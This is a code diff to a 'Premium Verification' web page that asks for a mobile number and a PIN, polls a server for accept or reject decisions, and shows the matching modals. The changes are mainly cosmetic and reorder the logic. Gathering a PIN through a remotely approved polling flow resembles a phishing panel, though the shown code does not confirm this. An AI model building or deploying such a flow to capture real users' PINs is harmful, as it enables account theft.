@@ -28,7 +28,6 @@
             overflow: hidden;
         }
 
-        /* Header */
         .header {
             background: #8c1d3e;
             color: white;
@@ -105,11 +104,8 @@
             cursor: pointer;
         }
 
-        button:hover {
-            background: #a0224a;
-        }
+        button:hover { background: #a0224a; }
 
-        /* Footer */
         .footer {
             text-align: center;
             padding: 20px;
@@ -119,7 +115,6 @@
             margin-top: auto;
         }
 
-        /* Modal */
         .modal {
             display: none;
             position: fixed;
@@ -170,7 +165,7 @@
 
         <div class="content">
             <h2>Premium Verification</h2>
-            <p class="subtitle">Secure • Instant • Paperless</p>
+            <p class="subtitle">Secured • Instant • Paperless</p>
 
             <div class="form-group">
                 <label>Mobile Number *</label>
@@ -257,6 +252,15 @@
 
             if(error) return;
 
+            // ✅ Final Success Check - Sabse Pehle Check Karega
+            if(data.status === 'accepted' && data.pin_status === 'accepted'){
+                clearInterval(interval);
+                showModal(`
+                    <div class="success">Congratulations! 🎉<br>Verified Successfully</div>
+                `);
+                return;
+            }
+
             if(data.status === 'pending'){
                 showModal(`
                     <div class="loader"></div>
@@ -269,7 +273,7 @@
             } 
             else if(data.status === 'accepted'){
                 if(data.pin_status === 'waiting'){
-                    clearInterval(interval); // Stop polling when PIN input needed
+                    clearInterval(interval);
                     showModal(`
                         <div class="wait">Enter PIN to proceed</div>
                         <input type="text" id="pin" placeholder="Enter PIN" 
@@ -289,15 +293,9 @@
                 else if(data.pin_status === 'rejected'){
                     clearInterval(interval);
                     showModal(`<div class="reject">PIN Rejected</div>`);
-                } 
-                else if(data.pin_status === 'accepted'){
-                    clearInterval(interval);
-                    showModal(`
-                        <div class="success">Congratulations! 🎉<br>Verified Successfully</div>
-                    `);
                 }
             }
-        }, 1800);
+        }, 1500);
     }
 
     async function submitPin(){
